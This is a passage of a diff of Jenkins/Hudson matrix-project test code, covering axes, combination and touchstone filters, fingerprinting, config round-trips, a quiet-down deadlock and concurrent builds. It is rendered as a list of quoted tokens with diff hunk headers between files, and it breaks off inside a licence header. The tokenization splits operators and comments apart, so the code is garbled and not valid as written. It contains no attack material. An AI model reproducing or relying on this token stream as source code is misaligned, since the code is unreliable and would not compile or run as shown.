".", "getBuildersList", "(", ").", "add", "(", "new", "Maven", "(", "'-", "Dprop", "=", "${", "db", "}", "validate", "'", ",", "maven", ".", "getName", "(", "))", ");", "/", "/", "we", "need", "a", "dummy", "build", "script", "that", "echos", "back", "our", "property", "p", ".", "setScm", "(", "new", "SingleFileSCM", "(", "\"", "pom", ".", "xml", "\"", ",", "getClass", "(", ").", "getResource", "(", "\"", "echo", "-", "property", ".", "pom", "\"", "))", ");", "MatrixBuild", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ")", ".", "get", "(", ");", "List", "<", "MatrixRun", ">", "runs", "=", "build", ".", "getRuns", "(", ");", "assertEquals", "(", "4", ",", "runs", ".", "size", "(", "))", ";", "for", "(", "MatrixRun", "run", ":", "runs", ")", "{", "j", ".", "assertBuildStatus", "(", "Result", ".", "SUCCESS", ",", "run", ")", ";", "String", "expectedDb", "=", "run", ".", "getParent", "(", ").", "getCombination", "(", ").", "get", "(", "\"", "db", "\"", ");", "System", ".", "out", ".", "println", "(", "run", ".", "getLog", "(", "))", ";", "j", ".", "assertLogContains", "(", "\"", "assertion", "\"", "+", "expectedDb", "+", "\"=", "\"+", "expectedDb", ",", "run", ")", ";", "/", "/", "also", "make", "sure", "that", "the", "variables", "are", "expanded", "at", "the", "command", "line", "level", ".", "assertFalse", "(", "run", ".", "getLog", "(", ").", "contains", "(", "'-", "Dprop", "=", "${", "db", "}", "')", ");", "}", "}", "/", "**", "*", "Test", "that", "configuration", "filters", "work", "*", "/", "@", "Test", "public", "void", "testConfigurationFilter", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "p", ".", "setCombinationFilter", "(", "\"", "db", "=", "=\\", "\"", "mysql", "\\", "\"\"", ");", "MatrixBuild", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ")", ".", "get", "(", ");", "assertEquals", "(", "2", ",", "build", ".", "getRuns", "(", ").", "size", "(", "))", ";", "}", "/", "**", "*", "Test", "that", "touch", "stone", "builds", "work", "*", "/", "@", "Test", "public", "void", "testTouchStone", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "p", ".", "setTouchStoneCombinationFilter", "(", "\"", "db", "=", "=\\", "\"", "mysql", "\\", "\"\"", ");", "p", ".", "setTouchStoneResultCondition", "(", "Result", ".", "SUCCESS", ")", ";", "MatrixBuild", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ")", ".", "get", "(", ");", "assertEquals", "(", "4", ",", "build", ".", "getRuns", "(", ").", "size", "(", "))", ";", "p", ".", "getBuildersList", "(", ").", "add", "(", "new", "UnstableBuilder", "(", "))", ";", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ")", ".", "get", "(", ");", "assertEquals", "(", "2", ",", "build", ".", "exactRuns", ".", "size", "(", "))", ";", "}", "protected", "MatrixProject", "createMatrixProject", "(", ")", "throws", "IOException", "{", "MatrixProject", "p", "=", "j", ".", "createMatrixProject", "(", ");", "/", "/", "set", "up", "2x2", "matrix", "AxisList", "axes", "=", "new", "AxisList", "(", ");", "axes", ".", "add", "(", "new", "TextAxis", "(", "\"", "db", "\"", ",\"", "mysql", "\"", ",\"", "oracle", "\"", "))", ";", "axes", ".", "add", "(", "new", "TextAxis", "(", "\"", "direction", "\"", ",\"", "north", "\"", ",\"", "south", "\"", "))", ";", "p", ".", "setAxes", "(", "axes", ")", ";", "return", "p", ";", "}", "/", "**", "*", "Fingerprinter", "failed", "to", "work", "on", "the", "matrix", "project", ".", "*", "/", "@", "Email", "(", "\"", "http", ":", "//", "www", ".", "nabble", ".", "com", "/", "1", ".", "286", "-", "version", "-", "and", "-", "fingerprints", "-", "option", "-", "broken", "-", ".-", "td22236618", ".", "html", "\"", ")", "@", "Test", "public", "void", "testFingerprinting", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "if", "(", "Functions", ".", "isWindows", "(", "))", "p", ".", "getBuildersList", "(", ").", "add", "(", "new", "BatchFile", "(", "\"", "echo", "\\", "\"\\", "\"", ">", "p", "\"", "))", ";", "else", "p", ".", "getBuildersList", "(", ").", "add", "(", "new", "Shell", "(", "\"", "touch", "p", "\"", "))", ";", "p", ".", "getPublishersList", "(", ").", "add", "(", "new", "ArtifactArchiver", "(", "\"", "p", "\"", ",", "null", ",", "false", ",", "false", ")", ");", "p", ".", "getPublishersList", "(", ").", "add", "(", "new", "Fingerprinter", "(", "\"\"", ",", "true", ")", ");", "j", ".", "buildAndAssertSuccess", "(", "p", ")", ";", "}", "void", "assertRectangleTable", "(", "MatrixProject", "p", ")", "{", "def", "html", "=", "j", ".", "createWebClient", "(", ").", "getPage", "(", "p", ")", ";", "HtmlTable", "table", "=", "html", ".", "selectSingleNode", "(", "\"", "id", "(", "'", "matrix", "'", ")/", "table", "\"", ")", "/", "/", "remember", "cells", "that", "are", "extended", "from", "rows", "above", ".", "def", "rowSpans", "=", "[", ":]", ";", "def", "masterWidth", "=", "null", "for", "(", "r", "in", "table", ".", "rows", ")", "{", "int", "width", "=", "r", ".", "cells", "*", ".", "columnSpan", ".", "sum", "(", ")", "+", "rowSpans", ".", "values", "(", ").", "sum", "(", "0", ")", ";", "if", "(", "masterWidth", "=", "=", "null", ")", "masterWidth", "=", "width", ";", "else", "assertEquals", "(", "masterWidth", ",", "width", ")", ";", "for", "(", "c", "in", "r", ".", "cells", ")", "rowSpans", "[", "c", ".", "rowSpan", "]", "=", "(", "rowSpans", "[", "c", ".", "rowSpan", "]", "?:", "0", ")", "+", "c", ".", "columnSpan", "/", "/", "shift", "rowSpans", "by", "one", "def", "nrs", "=", "[:", "]", "rowSpans", ".", "each", "{", "k", ",", "v", "-", ">", "if", "(", "k", ">", "1", ")", "nrs", "[", "k", "-", "1", "]", "=", "v", "}", "rowSpans", "=", "nrs", "}", "}", "@", "Bug", "(", "4245", ")", "@", "Test", "void", "testLayout1", "(", ")", "{", "/", "/", "5", "*", "5", "*", "5", "*", "5", "*", "5", "matrix", "def", "p", "=", "createMatrixProject", "(", ");", "p", ".", "axes", "=", "new", "AxisList", "(", "[", "'", "a", "'", ",'", "b", "'", ",'", "c", "'", ",'", "d", "'", ",'", "e", "'", "].", "collect", "{", "name", "-", ">", "new", "TextAxis", "(", "name", ",", "(", "1", ".", ".", "4", ")", "*.", "toString", "(", ")", ")", "}", ")", ";", "assertRectangleTable", "(", "p", ")", "}", "@", "Bug", "(", "4245", ")", "@", "Test", "void", "testLayout2", "(", ")", "{", "/", "/", "2", "*", "3", "*", "4", "*", "5", "*", "6", "matrix", "def", "p", "=", "createMatrixProject", "(", ");", "p", ".", "axes", "=", "new", "AxisList", "(", "(", "2", ".", ".", "6", ")", ".", "collect", "{", "n", "-", ">", "new", "TextAxis", "(", "\"", "axis", "$", "{", "n", "}", "\",", "(", "1", ".", ".", "n", ")", "*.", "toString", "(", ")", ")", "}", ")", ";", "assertRectangleTable", "(", "p", ")", "}", "/", "**", "*", "Makes", "sure", "that", "the", "configuration", "correctly", "roundtrips", ".", "*", "/", "@", "Test", "public", "void", "testConfigRoundtrip", "(", ")", "{", "j", ".", "jenkins", ".", "getJDKs", "(", ").", "addAll", "(", "[", "new", "JDK", "(", "\"", "jdk1", ".", "7", "\"", ",\"", "somewhere", "\"", "),", "new", "JDK", "(", "\"", "jdk1", ".", "6", "\"", ",\"", "here", "\"", "),", "new", "JDK", "(", "\"", "jdk1", ".", "5", "\"", ",\"", "there", "\"", ")]", ");", "List", "<", "Slave", ">", "slaves", "=", "(", "0", ".", ".", "2", ")", ".", "collect", "{", "j", ".", "createSlave", "(", ")", "}", "def", "p", "=", "createMatrixProject", "(", ");", "p", ".", "axes", ".", "add", "(", "new", "JDKAxis", "(", "[\"", "jdk1", ".", "6", "\"", ",\"", "jdk1", ".", "5", "\"", "])", ");", "p", ".", "axes", ".", "add", "(", "new", "LabelAxis", "(", "\"", "label1", "\"", ",[", "slaves", "[", "0", "]", ".", "nodeName", ",", "slaves", "[", "1", "]", ".", "nodeName", "]", "))", ";", "p", ".", "axes", ".", "add", "(", "new", "LabelAxis", "(", "\"", "label2", "\"", ",[", "slaves", "[", "2", "]", ".", "nodeName", "]", "))", ";", "/", "/", "make", "sure", "single", "value", "handling", "works", "OK", "def", "o", "=", "new", "AxisList", "(", "p", ".", "axes", ")", ";", "j", ".", "configRoundtrip", "(", "p", ")", ";", "def", "n", "=", "p", ".", "axes", ";", "assertEquals", "(", "o", ".", "size", "(", "),", "n", ".", "size", "(", "))", ";", "(", "0", ".", ".<", "(", "o", ".", "size", "(", "))", ").", "each", "{", "i", "-", ">", "def", "oi", "=", "o", "[", "i", "]", ";", "def", "ni", "=", "n", "[", "i", "]", ";", "assertSame", "(", "oi", ".", "class", ",", "ni", ".", "class", ")", ";", "assertEquals", "(", "oi", ".", "name", ",", "ni", ".", "name", ")", ";", "assertEquals", "(", "oi", ".", "values", ",", "ni", ".", "values", ")", ";", "}", "def", "before", "=", "new", "DefaultMatrixExecutionStrategyImpl", "(", "true", ",", "\"", "foo", "\"", ",", "Result", ".", "UNSTABLE", ",", "null", ")", "p", ".", "executionStrategy", "=", "before", ";", "j", ".", "configRoundtrip", "(", "p", ")", ";", "j", ".", "assertEqualDataBoundBeans", "(", "p", ".", "executionStrategy", ",", "before", ")", ";", "before", "=", "new", "DefaultMatrixExecutionStrategyImpl", "(", "false", ",", "null", ",", "null", ",", "null", ")", "p", ".", "executionStrategy", "=", "before", ";", "j", ".", "configRoundtrip", "(", "p", ")", ";", "j", ".", "assertEqualDataBoundBeans", "(", "p", ".", "executionStrategy", ",", "before", ")", ";", "}", "@", "Test", "public", "void", "testLabelAxes", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ");", "List", "<", "Slave", ">", "slaves", "=", "(", "0", ".", ".<", "4", ")", ".", "collect", "{", "j", ".", "createSlave", "(", ")", "}", "p", ".", "axes", ".", "add", "(", "new", "LabelAxis", "(", "\"", "label1", "\"", ",[", "slaves", "[", "0", "]", ".", "nodeName", ",", "slaves", "[", "1", "]", ".", "nodeName", "]", "))", ";", "p", ".", "axes", ".", "add", "(", "new", "LabelAxis", "(", "\"", "label2", "\"", ",[", "slaves", "[", "2", "]", ".", "nodeName", ",", "slaves", "[", "3", "]", ".", "nodeName", "]", "))", ";", "System", ".", "out", ".", "println", "(", "p", ".", "labels", ")", ";", "assertEquals", "(", "4", ",", "p", ".", "labels", ".", "size", "(", "))", ";", "assertTrue", "(", "p", ".", "labels", ".", "contains", "(", "j", ".", "jenkins", ".", "getLabel", "(", "\"", "slave0", "&", "&", "slave2", "\"", "))", ");", "assertTrue", "(", "p", ".", "labels", ".", "contains", "(", "j", ".", "jenkins", ".", "getLabel", "(", "\"", "slave1", "&", "&", "slave2", "\"", "))", ");", "assertTrue", "(", "p", ".", "labels", ".", "contains", "(", "j", ".", "jenkins", ".", "getLabel", "(", "\"", "slave0", "&", "&", "slave3", "\"", "))", ");", "assertTrue", "(", "p", ".", "labels", ".", "contains", "(", "j", ".", "jenkins", ".", "getLabel", "(", "\"", "slave1", "&", "&", "slave3", "\"", "))", ");", "}", "/", "**", "*", "Quiettng", "down", "Hudson", "causes", "a", "dead", "lock", "if", "the", "parent", "is", "running", "but", "children", "is", "in", "the", "queue", "*", "/", "@", "Bug", "(", "4873", ")", "@", "Test", "void", "testQuietDownDeadlock", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ");", "p", ".", "axes", "=", "new", "AxisList", "(", "new", "TextAxis", "(", "\"", "foo", "\"", ",\"", "1", "\"", ",\"", "2", "\"", "))", ";", "p", ".", "runSequentially", "=", "true", ";", "/", "/", "so", "that", "we", "can", "put", "the", "2nd", "one", "in", "the", "queue", "OneShotEvent", "firstStarted", "=", "new", "OneShotEvent", "(", ");", "OneShotEvent", "buildCanProceed", "=", "new", "OneShotEvent", "(", ");", "p", ".", "getBuildersList", "(", ").", "add", "(", "[", "perform", ":", "{", "AbstractBuild", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", "-", ">", "firstStarted", ".", "signal", "(", ");", "buildCanProceed", ".", "block", "(", ");", "return", "true", ";", "}", "]", "as", "TestBuilder", ")", ";", "Future", "f", "=", "p", ".", "scheduleBuild2", "(", "0", ")", "/", "/", "have", "foo", "=", "1", "block", "to", "make", "sure", "the", "2nd", "configuration", "is", "in", "the", "queue", "firstStarted", ".", "block", "(", ");", "/", "/", "enter", "into", "the", "quiet", "down", "while", "foo", "=", "2", "is", "still", "in", "the", "queue", "j", ".", "jenkins", ".", "doQuietDown", "(", ");", "buildCanProceed", ".", "signal", "(", ");", "/", "/", "make", "sure", "foo", "=", "2", "still", "completes", ".", "use", "time", "out", "to", "avoid", "hang", "j", ".", "assertBuildStatusSuccess", "(", "f", ".", "get", "(", "10", ",", "TimeUnit", ".", "SECONDS", ")", ");", "/", "/", "MatrixProject", "scheduled", "after", "the", "quiet", "down", "shouldn", "'", "t", "start", "try", "{", "Future", "g", "=", "p", ".", "scheduleBuild2", "(", "0", ")", "g", ".", "get", "(", "3", ",", "TimeUnit", ".", "SECONDS", ")", "fail", "(", ")", "}", "catch", "(", "TimeoutException", "e", ")", "{", "/", "/", "expected", "}", "}", "@", "Bug", "(", "9009", ")", "@", "Test", "void", "testTrickyNodeName", "(", ")", "{", "def", "names", "=", "[", "j", ".", "createSlave", "(", "\"", "Sean", "'", "s", "Workstation", "\"", ",", "null", ")", ",", "j", ".", "createSlave", "(", "\"", "John", "\\", "\"", "s", "Workstation", "\"", ",", "null", ")", "]", "*.", "nodeName", ";", "def", "p", "=", "createMatrixProject", "(", ");", "p", ".", "setAxes", "(", "new", "AxisList", "(", "[", "new", "LabelAxis", "(", "\"", "label", "\"", ",", "names", ")", "])", ");", "j", ".", "configRoundtrip", "(", "p", ")", ";", "LabelAxis", "a", "=", "p", ".", "axes", ".", "find", "(", "\"", "label", "\"", ");", "assertEquals", "(", "a", ".", "values", "as", "Set", ",", "names", "as", "Set", ")", ";", "}", "@", "Bug", "(", "10108", ")", "@", "Test", "void", "testTwoFileParams", "(", ")", "{", "def", "p", "=", "createMatrixProject", "(", ");", "p", ".", "axes", "=", "new", "AxisList", "(", "new", "TextAxis", "(", "\"", "foo", "\"", ",\"", "1", "\"", ",\"", "2", "\"", ",\"", "3", "\"", ",\"", "4", "\"", "))", ";", "p", ".", "addProperty", "(", "new", "ParametersDefinitionProperty", "(", "new", "FileParameterDefinition", "(", "\"", "a", ".", "txt", "\"", ",\"", "\")", ",", "new", "FileParameterDefinition", "(", "\"", "b", ".", "txt", "\"", ",\"", "\")", ",", ")", ");", "def", "dir", "=", "tmp", ".", "getRoot", "(", ")", "def", "f", "=", "p", ".", "scheduleBuild2", "(", "0", ",", "new", "LegacyCodeCause", "(", "),", "new", "ParametersAction", "(", "[", "\"", "aaa", "\"", ",\"", "bbb", "\"", "].", "collect", "{", "it", "-", ">", "def", "v", "=", "new", "FileParameterValue", "(", "it", "+", "\".", "txt", "\"", ",", "File", ".", "createTempFile", "(", "it", ",", "\"\"", ",", "dir", ")", ",", "it", ")", "v", ".", "setLocation", "(", "it", ")", "return", "v", ";", "}", ")", ")", "j", ".", "assertBuildStatusSuccess", "(", "f", ".", "get", "(", "10", ",", "TimeUnit", ".", "SECONDS", ")", ");", "}", "/", "**", "*", "Verifies", "that", "the", "concurrent", "build", "feature", "works", ",", "and", "makes", "sure", "*", "that", "each", "gets", "its", "own", "unique", "workspace", ".", "*", "/", "@", "Test", "void", "testConcurrentBuild", "(", ")", "{", "j", ".", "jenkins", ".", "numExecutors", "=", "10", "j", ".", "jenkins", ".", "updateComputerList", "(", ")", "def", "p", "=", "createMatrixProject", "(", ")", "p", ".", "axes", "=", "new", "AxisList", "(", "new", "TextAxis", "(", "\"", "foo", "\"", ",\"", "1", "\"", ",\"", "2", "\"", "))", "p", ".", "concurrentBuild", "=", "true", ";", "def", "latch", "=", "new", "CountDownLatch", "(", "4", ")", "def", "dirs", "=", "Collections", ".", "synchronizedSet", "(", "new", "HashSet", "(", "))", "p", ".", "buildersList", ".", "add", "(", "new", "TestBuilder", "(", ")", "{", "boolean", "perform", "(", "AbstractBuild", "<", "?,", "?", ">", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "{", "dirs", "<", "<", "build", ".", "workspace", ".", "getRemote", "(", ")", "def", "marker", "=", "build", ".", "workspace", ".", "child", "(", "\"", "file", "\"", ")", "def", "name", "=", "build", ".", "fullDisplayName", "marker", ".", "write", "(", "name", ",", "\"", "UTF", "-", "8", "\"", ")", "latch", ".", "countDown", "(", ")", "latch", ".", "await", "(", ")", "assertEquals", "(", "name", ",", "marker", ".", "readToString", "(", "))", "return", "true", "}", "}", ")", "/", "/", "should", "have", "gotten", "all", "unique", "names", "def", "f1", "=", "p", ".", "scheduleBuild2", "(", "0", ")", "/", "/", "get", "one", "going", "f1", ".", "waitForStart", "(", ")", "def", "f2", "=", "p", ".", "scheduleBuild2", "(", "0", ")", "[", "f1", ",", "f2", "]", "*.", "get", "(", ").", "each", "{", "j", ".", "assertBuildStatusSuccess", "(", "it", ")", "}", "assertEquals", "4", ",", "dirs", ".", "size", "(", ")", "}", "/", "**", "*", "Test", "that", "Actions", "are", "passed", "to", "configurations", "*", "/", "@", "Test", "public", "void", "testParameterActions", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "ParametersDefinitionProperty", "pdp", "=", "new", "ParametersDefinitionProperty", "(", "new", "StringParameterDefinition", "(", "\"", "PARAM_A", "\"", ",\"", "default_a", "\"", "),", "new", "StringParameterDefinition", "(", "\"", "PARAM_B", "\"", ",\"", "default_b", "\"", "),", ")", ";", "p", ".", "addProperty", "(", "pdp", ")", ";", "ParametersAction", "pa", "=", "new", "ParametersAction", "(", "pdp", ".", "getParameterDefinitions", "(", ").", "collect", "{", "return", "it", ".", "getDefaultParameterValue", "(", ")", "}", ")", "MatrixBuild", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ",", "new", "LegacyCodeCause", "(", "),", "pa", ")", ".", "get", "(", ");", "assertEquals", "(", "4", ",", "build", ".", "getRuns", "(", ").", "size", "(", "))", ";", "for", "(", "MatrixRun", "run", ":", "build", ".", "getRuns", "(", "))", "{", "ParametersAction", "pa1", "=", "run", ".", "getAction", "(", "ParametersAction", ".", "class", ")", ";", "assertNotNull", "(", "pa1", ")", ";", "[", "\"", "PARAM_A", "\"", ",\"", "PARAM_B", "\"", "].", "each", "{", "assertNotNull", "(", "pa1", ".", "getParameter", "(", "it", ")", ")", "}", "}", "}", "/", "**", "*", "Test", "that", "other", "Actions", "are", "passed", "to", "configurations", "*", "requires", "supported", "version", "of", "subversion", "plugin", "1", ".", "43", "+", "*", "/", "/", "/~", "public", "void", "testMatrixChildActions", "(", ")", "throws", "Exception", "{", "/", "/~", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "/", "/~", "ParametersDefinitionProperty", "pdp", "=", "new", "ParametersDefinitionProperty", "(", "/", "/~", "new", "StringParameterDefinition", "(", "\"", "PARAM_A", "\"", ",\"", "default_a", "\"", "),", "/", "/~", "new", "StringParameterDefinition", "(", "\"", "PARAM_B", "\"", ",\"", "default_b", "\"", "),", "/", "/~", ")", ";", "/", "/~", "p", ".", "addProperty", "(", "pdp", ")", ";", "/", "/~", "List", "<", "Action", ">", "actions", "=", "new", "ArrayList", "<", "Action", ">", "()", ";", "/", "/~", "actions", ".", "add", "(", "new", "RevisionParameterAction", "(", "new", "SvnInfo", "(", "\"", "http", ":", "//", "example", ".", "com", "/", "svn", "/", "repo", "/", "\",", "1234", ")", "))", ";", "/", "/~", "actions", ".", "add", "(", "new", "ParametersAction", "(", "pdp", ".", "getParameterDefinitions", "(", ").", "collect", "{", "return", "it", ".", "getDefaultParameterValue", "(", ")", "}", ")", ");", "/", "/~", "MatrixBuild", "build", "=", "p", ".", "scheduleBuild2", "(", "0", ",", "new", "LegacyCodeCause", "(", "),", "actions", ")", ".", "get", "(", ");", "/", "/~", "assertEquals", "(", "4", ",", "build", ".", "getRuns", "(", ").", "size", "(", "))", ";", "/", "/~", "for", "(", "MatrixRun", "run", ":", "build", ".", "getRuns", "(", "))", "{", "/", "/~", "ParametersAction", "pa1", "=", "run", ".", "getAction", "(", "ParametersAction", ".", "class", ")", ";", "/", "/~", "assertNotNull", "(", "pa1", ")", ";", "/", "/~", "[", "\"", "PARAM_A", "\"", ",\"", "PARAM_B", "\"", "].", "each", "{", "assertNotNull", "(", "pa1", ".", "getParameter", "(", "it", ")", ")", "}", ";", "/", "/~", "assertNotNull", "(", "run", ".", "getAction", "(", "RevisionParameterAction", ".", "class", ")", ");", "/", "/~", "}", "/", "/~", "}", "@", "Bug", "(", "15271", ")", "@", "LocalData", "@", "Test", "public", "void", "testUpgrade", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "j", ".", "jenkins", ".", "getItemByFullName", "(", "\"", "x", "\"", ",", "MatrixProject", ".", "class", ")", ";", "assertNotNull", "(", "p", ")", ";", "MatrixExecutionStrategy", "executionStrategy", "=", "p", ".", "getExecutionStrategy", "(", ");", "assertEquals", "(", "DefaultMatrixExecutionStrategyImpl", ".", "class", ",", "executionStrategy", ".", "getClass", "(", "))", ";", "DefaultMatrixExecutionStrategyImpl", "defaultExecutionStrategy", "=", "(", "DefaultMatrixExecutionStrategyImpl", ")", "executionStrategy", ";", "assertFalse", "(", "defaultExecutionStrategy", ".", "isRunSequentially", "(", "))", ";", "assertNull", "(", "defaultExecutionStrategy", ".", "getTouchStoneCombinationFilter", "(", "))", ";", "assertNull", "(", "defaultExecutionStrategy", ".", "getTouchStoneResultCondition", "(", "))", ";", "assertNull", "(", "defaultExecutionStrategy", ".", "getSorter", "(", "))", ";", "}", "@", "Bug", "(", "17337", ")", "@", "Test", "public", "void", "reload", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "j", ".", "createMatrixProject", "(", ");", "AxisList", "axes", "=", "new", "AxisList", "(", ");", "axes", ".", "add", "(", "new", "TextAxis", "(", "\"", "p", "\"", ",", "\"", "only", "\"", "))", ";", "p", ".", "setAxes", "(", "axes", ")", ";", "String", "n", "=", "p", ".", "getFullName", "(", ");", "j", ".", "buildAndAssertSuccess", "(", "p", ")", ";", "j", ".", "jenkins", ".", "reload", "(", ");", "p", "=", "j", ".", "jenkins", ".", "getItemByFullName", "(", "n", ",", "MatrixProject", ".", "class", ")", ";", "assertNotNull", "(", "p", ")", ";", "MatrixConfiguration", "c", "=", "p", ".", "getItem", "(", "\"", "p", "=", "only", "\"", ");", "assertNotNull", "(", "c", ")", ";", "assertNotNull", "(", "c", ".", "getBuildByNumber", "(", "1", ")", ");", "}", "/", "**", "*", "Given", "a", "small", "master", "and", "a", "big", "exclusive", "slave", ",", "the", "fair", "scheduling", "would", "prefer", "running", "the", "flyweight", "job", "*", "in", "the", "slave", ".", "But", "if", "the", "scheduler", "honors", "the", "EXCLUSIVE", "flag", ",", "then", "we", "should", "see", "it", "built", "on", "the", "master", ".", "*", "*", "Since", "there", "'", "s", "a", "chance", "that", "the", "fair", "scheduling", "just", "so", "happens", "to", "pick", "up", "the", "master", "by", "chance", ",", "*", "we", "try", "multiple", "jobs", "to", "reduce", "the", "chance", "of", "that", "happening", ".", "*", "/", "@", "Bug", "(", "5076", ")", "@", "Test", "public", "void", "dontRunOnExclusiveSlave", "(", ")", "{", "def", "projects", "=", "(", "0", ".", ".", "10", ")", ".", "collect", "{", "def", "m", "=", "j", ".", "createMatrixProject", "(", ")", "def", "axes", "=", "new", "AxisList", "(", ");", "axes", ".", "add", "(", "new", "TextAxis", "(", "\"", "p", "\"", ",", "\"", "only", "\"", "))", ";", "m", ".", "axes", "=", "axes", "return", "m", ";", "}", "def", "s", "=", "new", "DumbSlave", "(", "\"", "big", "\"", ",", "\"", "this", "is", "a", "big", "slave", "\"", ",", "j", ".", "createTmpDir", "(", ").", "path", ",", "\"", "20", "\"", ",", "EXCLUSIVE", ",", "\"", "\",", "j", ".", "createComputerLauncher", "(", "null", ")", ",", "RetentionStrategy", ".", "NOOP", ")", ";", "j", ".", "jenkins", ".", "addNode", "(", "s", ")", ";", "s", ".", "toComputer", "(", ").", "connect", "(", "false", ")", ".", "get", "(", ");", "/", "/", "connect", "this", "guy", "projects", ".", "each", "{", "p", "-", ">", "def", "b", "=", "j", ".", "assertBuildStatusSuccess", "(", "p", ".", "scheduleBuild2", "(", "2", ")", ")", "assertSame", "(", "b", ".", "builtOn", ",", "j", ".", "jenkins", ")", "}", "}", "}", "@", "@", "-", "1", ",", "48", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "HudsonTestCase", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "TestExtension", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "/", "**", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixConfigurationSorterTest", "extends", "HudsonTestCase", "{", "public", "void", "testConfigRoundtrip", "(", ")", "throws", "Exception", "{", "MatrixProject", "p", "=", "createMatrixProject", "(", ");", "configRoundtrip", "(", "(", "Item", ")", "p", ")", ";", "assertEqualDataBoundBeans", "(", "new", "NoopMatrixConfigurationSorter", "(", "),", "p", ".", "getSorter", "(", "))", ";", "SorterImpl", "before", "=", "new", "SorterImpl", "(", ");", "p", ".", "setSorter", "(", "before", ")", ";", "p", ".", "setRunSequentially", "(", "true", ")", ";", "configRoundtrip", "(", "(", "Item", ")", "p", ")", ";", "Object", "after", "=", "p", ".", "getSorter", "(", ");", "assertNotSame", "(", "before", ",", "after", ")", ";", "assertSame", "(", "before", ".", "getClass", "(", "),", "after", ".", "getClass", "(", "))", ";", "}", "public", "static", "class", "SorterImpl", "extends", "MatrixConfigurationSorter", "{", "@", "DataBoundConstructor", "public", "SorterImpl", "(", ")", "{", "}", "@", "Override", "public", "void", "validate", "(", "MatrixProject", "p", ")", "throws", "FormValidation", "{", "}", "public", "int", "compare", "(", "MatrixConfiguration", "o1", ",", "MatrixConfiguration", "o2", ")", "{", "return", "o1", ".", "getDisplayName", "(", ").", "compareTo", "(", "o2", ".", "getDisplayName", "(", "))", ";", "}", "@", "TestExtension", "public", "static", "class", "DescriptorImpl", "extends", "MatrixConfigurationSorterDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Test", "Sorter", "\"", ";", "}", "}", "}", "}", "@", "@", "-", "1", ",", "41", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "HudsonTestCase", ";", "import", "hudson", ".", "model", ".", "AbstractProject", ";", "import", "hudson", ".", "model", ".", "FreeStyleBuild", ";", "import", "hudson", ".", "model", ".", "FreeStyleProject", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "hudson", ".", "tasks", ".", "BuildTrigger", ";", "import", "hudson", ".", "util", ".", "RunList", ";", "/", "**", "*", "@", "author", "Stefan", "Wolf", "*", "/", "public", "class", "MatrixProjectDependencyTest", "extends", "HudsonTestCase", "{", "/", "**", "*", "Checks", "if", "the", "MatrixProject", "adds", "and", "Triggers", "downstream", "Projects", "via", "*", "the", "DependencyGraph", "*", "/", "public", "void", "testMatrixProjectTriggersDependencies", "(", ")", "throws", "Exception", "{", "MatrixProject", "matrixProject", "=", "createMatrixProject", "(", ");", "FreeStyleProject", "freestyleProject", "=", "createFreeStyleProject", "(", ");", "matrixProject", ".", "getPublishersList", "(", ").", "add", "(", "new", "BuildTrigger", "(", "freestyleProject", ".", "getName", "(", "),", "false", ")", ");", "jenkins", ".", "rebuildDependencyGraph", "(", ");", "buildAndAssertSuccess", "(", "matrixProject", ")", ";", "waitUntilNoActivity", "(", ");", "RunList", "<", "FreeStyleBuild", ">", "builds", "=", "freestyleProject", ".", "getBuilds", "(", ");", "assertEquals", "(", "\"", "There", "should", "only", "be", "one", "FreestyleBuild", "\"", ",", "1", ",", "builds", ".", "size", "(", "))", ";", "FreeStyleBuild", "build", "=", "builds", ".", "iterator", "(", ").", "next", "(", ");", "assertEquals", "(", "Result", ".", "SUCCESS", ",", "build", ".", "getResult", "(", "))", ";", "List", "<", "AbstractProject", ">", "downstream", "=", "jenkins", ".", "getDependencyGraph", "(", ").", "getDownstream", "(", "matrixProject", ")", ";", "assertTrue", "(", "downstream", ".", "contains", "(", "freestyleProject", ")", ");", "}", "}", "@", "@", "-", "1", ",", "76", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2010", "-", "2011", ",", "Alan", "Harder", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", 